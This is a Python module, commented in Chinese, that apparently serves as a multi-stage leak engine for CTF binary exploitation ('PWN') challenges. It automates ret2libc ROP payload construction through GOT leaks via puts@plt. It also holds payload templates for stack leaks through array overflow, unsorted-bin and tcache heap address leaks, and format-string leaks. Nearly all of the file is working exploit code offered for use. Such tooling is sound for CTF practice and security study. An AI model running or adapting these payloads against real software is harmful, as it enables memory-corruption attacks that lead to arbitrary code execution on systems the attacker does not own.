#!/usr/bin/env python3
"""
多步信息泄露引擎
支持: leak → compute → leak → compute → ... → exploit
用于需要多轮交互式信息泄露的PWN题目
"""

import os
import sys
import re
import struct
import subprocess
import tempfile
import textwrap
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable, Tuple
from enum import Enum


class LeakKind(Enum):
    STACK_ADDR = "stack_addr"        # 栈地址泄露
    LIBC_ADDR = "libc_addr"          # libc地址泄露
    HEAP_ADDR = "heap_addr"          # 堆地址泄露
    PIE_ADDR = "pie_addr"            # PIE基址泄露
    CANARY = "canary"                # canary泄露
    CUSTOM = "custom"                # 自定义


@dataclass
class LeakStep:
    """单步泄露定义"""
    name: str                        # 步骤名
    kind: LeakKind                   # 泄露类型
    trigger_func: Callable           # 触发泄露的函数(io, prior_leaks) -> bytes
    parse_func: Callable             # 解析泄露值(leaked_bytes) -> int
    compute_func: Callable           # 计算: (leaked_value, prior_leaks) -> adjusted_value
    retry_on_fail: bool = True       # 失败后是否重试
    max_retries: int = 3             # 最大重试次数


@dataclass
class MultiStagePlan:
    """多阶段利用计划"""
    name: str
    description: str
    leak_steps: List[LeakStep] = field(default_factory=list)
    final_exploit: Optional[Callable] = None  # (leaks_dict) -> bool
    max_total_steps: int = 10


class MultiStageLeakEngine:
    """
    多步信息泄露引擎
    
    典型使用场景:
    1. Badboy风格: 数组溢出泄露栈地址 → 泄露libc → GOT覆写
    2. ret2libc风格: leak puts@got → 计算libc_base → 计算system → ret2libc
    3. 堆题风格: unsorted bin leak libc → leak heap → tcache poison → rtld_global
    """
    
    def __init__(self, binary_path, libc_path=None, verbose=True):
        self.binary_path = binary_path
        self.libc_path = libc_path
        self.verbose = verbose
        
        # 预定义泄露模式
        self._known_patterns = self._build_known_patterns()
    
    def log(self, msg):
        if self.verbose:
            print(f"  [leak] {msg}", flush=True)
    
    def execute_plan(self, io, plan: MultiStagePlan) -> Dict[str, int]:
        """执行多阶段泄露计划
        
        Returns: {step_name: computed_value, ...}
        """
        self.log(f"执行泄露计划: {plan.name}")
        leaks = {}
        
        for i, step in enumerate(plan.leak_steps):
            self.log(f"  [{i+1}/{len(plan.leak_steps)}] {step.name} ({step.kind.value})")
            
            for retry in range(step.max_retries + 1):
                try:
                    # 触发泄露
                    raw = step.trigger_func(io, leaks)
                    if not raw:
                        if step.retry_on_fail and retry < step.max_retries:
                            self.log(f"    重试 {retry+1}/{step.max_retries}...")
                            continue
                        self.log(f"    ✗ 泄露失败")
                        break
                    
                    # 解析泄露值
                    leaked_value = step.parse_func(raw)
                    if leaked_value is None:
                        if step.retry_on_fail and retry < step.max_retries:
                            self.log(f"    解析失败，重试 {retry+1}/{step.max_retries}...")
                            continue
                        self.log(f"    ✗ 解析失败")
                        break
                    
                    # 计算调整值
                    adjusted = step.compute_func(leaked_value, leaks)
                    
                    leaks[step.name] = adjusted
                    self.log(f"    ✓ {step.name} = {hex(adjusted)} "
                            f"(raw={hex(leaked_value)})")
                    break
                    
                except Exception as e:
                    if step.retry_on_fail and retry < step.max_retries:
                        self.log(f"    异常: {e}, 重试 {retry+1}/{step.max_retries}...")
                        continue
                    self.log(f"    ✗ 异常: {e}")
                    break
        
        return leaks
    
    def _build_known_patterns(self) -> Dict[str, dict]:
        """构建已知泄露模式库"""
        patterns = {}
        
        # 模式1: puts泄露GOT条目
        patterns['puts_got_leak'] = {
            'description': '通过puts@plt打印GOT中的libc函数地址',
            'template': textwrap.dedent('''
            # Step {step}: leak {target_func}@got via puts@plt
            payload = b'A' * {offset}
            payload += p64(POP_RDI)
            payload += p64(elf.got['{target_func}'])
            payload += p64(elf.plt['puts'])
            payload += p64(RET_ADDR)
            io.sendlineafter(b'{prompt}', payload)
            leaked = u64(io.recv(6).ljust(8, b'\\x00'))
            {var_name} = leaked - libc.symbols['{target_func}']
            log.info(f"{var_name} = {{hex({var_name})}}")
            '''),
        }
        
        # 模式2: write泄露栈地址 (Badboy风格)
        patterns['write_stack_leak'] = {
            'description': '通过write@plt泄露栈上地址 (数组溢出)',
            'template': textwrap.dedent('''
            # Step {step}: leak stack address via array overflow
            payload = str({leak_offset})
            io.sendlineafter(b'{prompt}', payload)
            stack_leak = u64(io.recv({recv_len}).ljust(8, b'\\x00'))
            {var_name} = stack_leak - {adjust}
            log.info(f"{var_name} = {{hex({var_name})}}")
            '''),
        }
        
        # 模式3: unsorted bin泄露libc (堆题)
        patterns['unsorted_bin_leak'] = {
            'description': 'free chunk进入unsorted bin → fd指向main_arena → leak libc',
            'template': textwrap.dedent('''
            # Step {step}: unsorted bin leak libc
            add(0, {chunk_size})
            add(1, 0x20)  # barrier
            delete(0)
            add(2, {alloc_size})  # split unsorted bin
            show(0)
            leaked = u64(io.recv(6).ljust(8, b'\\x00'))
            {var_name} = leaked - {main_arena_offset}
            log.info(f"{var_name} = {{hex({var_name})}}")
            '''),
        }
        
        # 模式4: heap地址泄露 (tcache fd)
        patterns['heap_leak'] = {
            'description': 'tcache bin中free两个chunk → fd指向下一个 → leak heap',
            'template': textwrap.dedent('''
            # Step {step}: leak heap address via tcache fd
            add(0, {chunk_size})
            add(1, {chunk_size})
            delete(1)
            delete(0)  # fd now points to chunk 1
            show(0)
            heap_leak = u64(io.recv(6).ljust(8, b'\\x00'))
            {var_name} = heap_leak - {adjust}
            log.info(f"{var_name} = {{hex({var_name})}}")
            '''),
        }
        
        # 模式5: printf格式化字符串泄露
        patterns['fmt_leak'] = {
            'description': '格式化字符串漏洞泄露栈/寄存器内容',
            'template': textwrap.dedent('''
            # Step {step}: format string leak at offset {fmt_offset}
            payload = f'%{{{fmt_offset}}}$p'.encode()
            io.sendlineafter(b'{prompt}', payload)
            leaked_str = io.recvline().strip()
            leaked = int(leaked_str, 16)
            {var_name} = leaked - {adjust}
            log.info(f"{var_name} = {{hex({var_name})}}")
            '''),
        }
        
        return patterns
    
    def build_ret2libc_plan(self, offset: int = 0x40, leak_func: str = 'puts',
                            pop_rdi: int = None, ret_addr: int = None,
                            prompt: bytes = b'>') -> MultiStagePlan:
        """构建ret2libc多步泄露计划
        
        Step 1: leak puts@got → 计算 libc_base
        Step 2: 计算 system 和 /bin/sh 地址 → ret2libc
        """
        plan = MultiStagePlan(
            name='ret2libc_multi_stage',
            description=f'leak {leak_func}@got → compute libc → ret2libc',
        )
        
        plan.leak_steps.append(LeakStep(
            name='libc_base',
            kind=LeakKind.LIBC_ADDR,
            trigger_func=lambda io, leaks: self._trigger_puts_leak(
                io, leak_func, offset, pop_rdi, ret_addr, prompt
            ),
            parse_func=lambda raw: u64(raw.ljust(8, b'\x00')),
            compute_func=lambda val, leaks: self._compute_libc_base(val, leak_func),
        ))
        
        return plan
    
    def build_heap_leak_plan(self, chunk_size: int = 0x428,
                             main_arena_offset: int = None) -> MultiStagePlan:
        """构建堆题多步泄露计划
        
        Step 1: unsorted bin leak → libc_base
        Step 2: tcache fd leak → heap_base
        """
        plan = MultiStagePlan(
            name='heap_multi_stage',
            description='unsorted bin leak libc → tcache leak heap → poison',
        )
        
        # 具体实现在实际使用中通过add/show/delete回调完成
        return plan
    
    def _trigger_puts_leak(self, io, func_name, offset, pop_rdi, ret_addr, prompt):
        """触发puts泄露 — 返回泄露的原始字节"""
        from pwn import p64, ELF
        elf = ELF(self.binary_path, checksec=False)
        
        got_addr = elf.got.get(func_name, 0)
        if not got_addr or not pop_rdi:
            return None
        
        plt_puts = elf.plt.get('puts', 0)
        if not plt_puts:
            # fallback: 使用已有的puts地址
            plt_puts = elf.plt.get('printf', 0)
        
        payload = b'A' * offset
        payload += p64(pop_rdi) + p64(got_addr)
        payload += p64(plt_puts)
        if ret_addr:
            payload += p64(ret_addr)
        
        io.sendlineafter(prompt, payload)
        leaked = io.recv(6)
        return leaked
    
    def _compute_libc_base(self, leaked_addr, func_name):
        """根据泄露地址计算libc基址"""
        try:
            from pwn import ELF
            if self.libc_path and os.path.exists(self.libc_path):
                libc = ELF(self.libc_path, checksec=False)
                sym_addr = libc.symbols.get(func_name, 0)
                if sym_addr:
                    return leaked_addr - sym_addr
        except Exception:
            pass
        return leaked_addr  # 无法计算时返回原始值


def test_multi_stage_leak():
    """自测"""
    engine = MultiStageLeakEngine('/nonexistent', verbose=True)
    
    # 测试已知模式
    patterns = engine._build_known_patterns()
    assert 'puts_got_leak' in patterns
    assert 'unsorted_bin_leak' in patterns
    assert 'heap_leak' in patterns
    assert 'fmt_leak' in patterns
    assert 'write_stack_leak' in patterns
    print("✓ Known patterns available:", list(patterns.keys()))
    
    # 测试plan构建
    plan = engine.build_ret2libc_plan(offset=0x40)
    assert plan.name == 'ret2libc_multi_stage'
    assert len(plan.leak_steps) == 1
    print("✓ Plan building works")
    
    print("\n=== All multi_stage_leak tests passed ===")


if __name__ == '__main__':
    test_multi_stage_leak()
